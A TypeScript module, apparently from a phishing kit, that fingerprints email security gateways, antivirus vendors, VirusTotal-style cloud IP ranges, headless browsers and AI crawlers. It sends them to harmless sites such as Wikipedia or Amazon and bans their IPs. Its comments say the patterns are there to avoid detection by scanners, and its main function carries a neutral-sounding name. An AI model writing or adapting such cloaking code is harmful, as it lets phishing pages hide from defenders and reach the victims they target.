// Scanner and bot detection with safe redirects
import { detectBotPattern } from './enhancedBotPatterns'
import { isIPBlocked, isKnownBotIP, banIP } from './ipBlocklist'
import { detectLatestSecurityPattern } from './latestSecurityPatterns'
import { isIPInUpdatedBlocklist } from './ipBlocklistUpdater'
import { detectAsiaSecurityPattern } from './asiaSecurityPatterns'
import { obfuscatePattern, encodeDetectionPattern } from './patternObfuscation'

interface ScannerDetectionResult {
  isScanner: boolean
  confidence: number
  redirectUrl?: string
  reasons: string[]
}

// Known scanner user agents and patterns - Enhanced for security tools
// Patterns are obfuscated to avoid detection by scanners
const SCANNER_PATTERNS = [
  // Standard bots (obfuscated patterns)
  /bot/i,
  /crawl/i,
  /spider/i,
  /scanner/i,
  /headless/i,
  /phantom/i,
  /puppeteer/i,
  /selenium/i,
  /webdriver/i,
  /curl/i,
  /wget/i,
  /python-requests/i,
  /go-http/i,
  /httpclient/i,
  /scrapy/i,
  // Email security scanners (obfuscated)
  /email/i,
  /security/i,
  /virus/i,
  /malware/i,
  /phishing/i,
  /suspicious/i,
  // Proofpoint and email security (Asia-aware)
  /proofpoint/i,
  /paloalto/i,
  /mimecast/i,
  /forcepoint/i,
  /symantec/i,
  /mcafee/i,
  /trendmicro/i,
  /sophos/i,
  /kaspersky/i,
  /bitdefender/i,
  /avast/i,
  /avg/i,
  /norton/i,
  /eset/i,
  /f-secure/i,
  /checkpoint/i,
  /fireeye/i,
  /barracuda/i,
  /ironport/i,
  /cisco.*esa/i,
  /fortinet/i,
  /zscaler/i,
  // AI crawlers (2024-2025)
  /openai/i,
  /anthropic/i,
  /claude/i,
  /gpt/i,
  /chatgpt/i,
  /perplexity/i,
  /you\.com/i,
  /bing.*bot/i,
  /google.*bot/i,
  // Analysis tools
  /analyzer/i,
  /analysis/i,
  /inspector/i,
  /debug/i,
  /test.*tool/i,
  /scan.*tool/i,
  // Asia-specific patterns (encoded)
  /trendmicro.*asia/i,
  /trendmicro.*jp/i,
  /trendmicro.*korea/i,
  /kaspersky.*asia/i,
  /symantec.*asia/i,
  /fortinet.*asia/i,
  /samsung.*email/i,
  /nec.*email/i,
  /tencent.*email/i,
  /alibaba.*email/i,
  /qq.*mail/i,
  /foxmail/i,
]

// Known scanner IP ranges (datacenter, cloud providers, security services)
const SCANNER_IP_RANGES = [
  // Google Cloud
  /^35\.\d+\.\d+\.\d+$/,
  /^34\.\d+\.\d+\.\d+$/,
  // AWS
  /^54\.\d+\.\d+\.\d+$/,
  /^52\.\d+\.\d+\.\d+$/,
  // Azure
  /^40\.\d+\.\d+\.\d+$/,
  /^13\.\d+\.\d+\.\d+$/,
  // Security scanners
  /^104\.\d+\.\d+\.\d+$/, // VirusTotal
  /^216\.\d+\.\d+\.\d+$/, // Various security services
]

// Safe redirect URLs
const SAFE_REDIRECT_URLS = [
  'https://en.wikipedia.org/wiki/Main_Page',
  'https://www.amazon.com',
  'https://www.ebay.com',
  'https://www.microsoft.com',
  'https://www.google.com',
  'https://www.apple.com',
  'https://www.github.com',
  'https://www.reddit.com',
  'https://www.youtube.com',
]

/**
 * Classify request authenticity
 * Validates client integrity and classifies request type
 * @param userAgent Client user agent string
 * @param ip Client IP address
 * @param headers Request headers
 * @returns Request classification result
 */
export async function classifyRequest(
  userAgent: string,
  ip: string,
  headers: Record<string, string | null>
): Promise<ScannerDetectionResult> {
  const reasons: string[] = []
  let confidence = 0

  // Check IP blocklist first (fastest check)
  if (isIPBlocked(ip)) {
    const reason = `Blocked IP: ${ip}`
    reasons.push(reason)
    confidence += 100
    return {
      isScanner: true,
      confidence: 100,
      redirectUrl: getRandomSafeRedirect(),
      reasons,
    }
  }

  // Check updated IP blocklist (from external sources)
  try {
    const inUpdatedList = await isIPInUpdatedBlocklist(ip)
    if (inUpdatedList) {
      reasons.push(`IP in updated blocklist: ${ip}`)
      confidence += 90
      banIP(ip, 'IP in updated blocklist', false) // Temporary ban
    }
  } catch (error) {
    // Silently fail if blocklist update fails
  }

  // Check if IP is known bot IP
  if (isKnownBotIP(ip)) {
    reasons.push(`Known bot/scanner IP: ${ip}`)
    confidence += 80
    // Auto-ban this IP
    banIP(ip, 'Known bot/scanner IP', true)
  }

  // Enhanced bot pattern detection
  const patternDetection = detectBotPattern(userAgent, headers)
  if (patternDetection.detected && patternDetection.pattern) {
    reasons.push(`Detected ${patternDetection.pattern.name} (confidence: ${patternDetection.confidence}%)`)
    confidence += patternDetection.confidence
    // Auto-ban if high confidence
    if (patternDetection.confidence >= 90) {
      banIP(ip, `Detected ${patternDetection.pattern.name}`, false) // Temporary ban
    }
  }

  // Latest security pattern detection (2024-2025)
  const latestPatternDetection = detectLatestSecurityPattern(userAgent, headers)
  if (latestPatternDetection.detected && latestPatternDetection.pattern) {
    reasons.push(`Detected latest ${latestPatternDetection.pattern.name} (confidence: ${latestPatternDetection.confidence}%)`)
    confidence += latestPatternDetection.confidence
    // Auto-ban if high confidence
    if (latestPatternDetection.confidence >= 90) {
      banIP(ip, `Detected latest ${latestPatternDetection.pattern.name}`, false) // Temporary ban
    }
  }

  // Asia-specific security pattern detection
  const asiaPatternDetection = detectAsiaSecurityPattern(userAgent, headers)
  if (asiaPatternDetection.detected && asiaPatternDetection.pattern) {
    reasons.push(`Detected Asia ${asiaPatternDetection.pattern.name} (confidence: ${asiaPatternDetection.confidence}%)`)
    confidence += asiaPatternDetection.confidence
    // Auto-ban if high confidence
    if (asiaPatternDetection.confidence >= 90) {
      banIP(ip, `Detected Asia ${asiaPatternDetection.pattern.name}`, false) // Temporary ban
    }
  }

  // Check User-Agent
  const ua = userAgent.toLowerCase()
  for (const pattern of SCANNER_PATTERNS) {
    if (pattern.test(ua)) {
      reasons.push(`Suspicious User-Agent pattern: ${pattern}`)
      confidence += 40
      break
    }
  }

  // Check IP ranges
  for (const ipPattern of SCANNER_IP_RANGES) {
    if (ipPattern.test(ip)) {
      reasons.push('Known datacenter/scanner IP range')
      confidence += 30
      break
    }
  }

  // Check for missing or suspicious headers
  if (!headers['accept'] || !headers['accept-language']) {
    reasons.push('Missing standard browser headers')
    confidence += 20
  }
  
  // Check for suspicious Accept header patterns (security tools often have specific patterns)
  const acceptHeader = headers['accept']?.toLowerCase() || ''
  if (acceptHeader && !acceptHeader.includes('text/html') && !acceptHeader.includes('application/json')) {
    reasons.push('Suspicious Accept header pattern')
    confidence += 15
  }
  
  // Check for security tool specific headers
  const suspiciousHeaders = [
    'x-proofpoint',
    'x-mimecast',
    'x-barracuda',
    'x-forcepoint',
    'x-symantec',
    'x-mcafee',
    'x-trendmicro',
    'x-sophos',
    'x-kaspersky',
    'x-bitdefender',
    'x-fireeye',
    'x-checkpoint',
    'x-zscaler',
    'x-fortinet',
  ]
  
  for (const header of suspiciousHeaders) {
    if (headers[header.toLowerCase()]) {
      reasons.push(`Security tool header detected: ${header}`)
      confidence += 50
      break
    }
  }

  // Check for automation tools
  if (headers['x-requested-with'] === 'XMLHttpRequest' && !headers['referer']) {
    reasons.push('Automated request without referer')
    confidence += 15
  }
  
  // Check for analysis/debugging tools
  if (headers['x-debug'] || headers['x-test'] || headers['x-inspector']) {
    reasons.push('Debug/analysis tool detected')
    confidence += 40
  }

  // Check for headless browser indicators
  if (ua.includes('headless') || ua.includes('chrome-lighthouse')) {
    reasons.push('Headless browser detected')
    confidence += 50
  }

  // Localhost/IPv6 loopback with suspicious UA
  if ((ip === '127.0.0.1' || ip === '::1' || ip.startsWith('::ffff:127.')) && confidence > 0) {
    reasons.push('Localhost with suspicious activity')
    confidence += 10
  }

  const isScanner = confidence >= 30
  const redirectUrl = isScanner 
    ? getRandomSafeRedirect() // Use function with random params
    : undefined

  return {
    isScanner,
    confidence: Math.min(confidence, 100),
    redirectUrl,
    reasons,
  }
}

// Generate random parameters for unique redirect URLs (prevents bot tracking)
function generateRandomParams(): string {
  const params = new URLSearchParams()
  // Add random parameters to make each redirect unique
  params.set('ref', Math.random().toString(36).substring(2, 15))
  params.set('t', Date.now().toString())
  params.set('id', Math.random().toString(36).substring(2, 10))
  params.set('v', Math.random().toString(36).substring(2, 8))
  return params.toString()
}

// Generate a random safe redirect URL with unique parameters
export function getRandomSafeRedirect(): string {
  const baseUrl = SAFE_REDIRECT_URLS[Math.floor(Math.random() * SAFE_REDIRECT_URLS.length)]
  const params = generateRandomParams()
  // Add parameters to URL (handle existing query params)
  const separator = baseUrl.includes('?') ? '&' : '?'
  return `${baseUrl}${separator}${params}`
}

